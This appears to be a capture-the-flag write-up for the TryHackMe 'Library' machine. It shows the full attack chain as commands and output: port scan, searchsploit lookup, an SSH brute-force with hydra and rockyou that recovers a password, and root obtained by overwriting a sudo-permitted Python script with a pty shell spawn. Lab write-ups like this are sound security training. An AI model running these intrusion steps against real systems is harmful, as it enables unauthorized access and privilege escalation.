---
title: Library
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Library
  machine on TryHackMe.
slug: library
---




```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
└─$ searchsploit openssh 7.2p2
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                          | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                         | linux/dos/40888.py
OpenSSH 7.2p2 - Username Enumeration                                                                                    | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                    | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                    | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration   
```

```
msf auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 10.66.174.57
rhosts => 10.66.174.57
msf auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 10.66.174.57:22 - SSH - Using malformed packet technique
[*] 10.66.174.57:22 - SSH - Checking for false positives
[-] 10.66.174.57:22 - SSH - throws false positive results. Aborting.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```
hydra -t 20 -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.66.174.57

[22][ssh] host: 10.66.174.57   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found

```

```
meliodas@ubuntu:~$ cat user.txt
```

```
meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

```

```
meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt

```